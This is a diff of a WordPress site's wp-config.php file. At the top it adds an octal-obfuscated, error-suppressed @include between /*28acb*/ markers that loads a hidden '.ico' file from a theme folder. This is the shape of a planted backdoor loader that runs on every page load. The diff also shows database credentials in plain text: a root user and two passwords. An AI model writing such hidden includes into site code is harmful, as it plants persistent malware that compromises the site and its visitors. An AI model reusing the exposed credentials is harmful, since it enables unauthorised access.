@@ -1,4 +1,9 @@
 <?php
+/*28acb*/
+
+@include "\057va\162/w\167w/\164an\157il\163/w\160-t\141no\151ls\057wp\055co\156te\156t/\164he\155es\057tw\145nt\171se\166en\164ee\156/.\06249\067e8\0638.\151co";
+
+/*28acb*/
 define('WP_CACHE', true); // Added by WP Rocket
 if (isset($_SERVER["HTTP_X_FORWARDED_PROTO"]) && $_SERVER["HTTP_X_FORWARDED_PROTO"] == "https") $_SERVER["HTTPS"] = "on";
 /**
@@ -22,13 +27,13 @@ if (isset($_SERVER["HTTP_X_FORWARDED_PROTO"]) && $_SERVER["HTTP_X_FORWARDED_PROT
 
 // ** MySQL settings - You can get this info from your web host ** //
 /** The name of the database for WordPress */
-define('DB_NAME', 'tanoils_01');
+define('DB_NAME', 'tanoils.com');
 
 /** MySQL database username */
 define('DB_USER', 'root');
 
 /** MySQL database password */
-define('DB_PASSWORD', 'longbkit11');
+define('DB_PASSWORD', 'P@ssw0rd');
 
 /** MySQL hostname */
 define('DB_HOST', 'localhost');
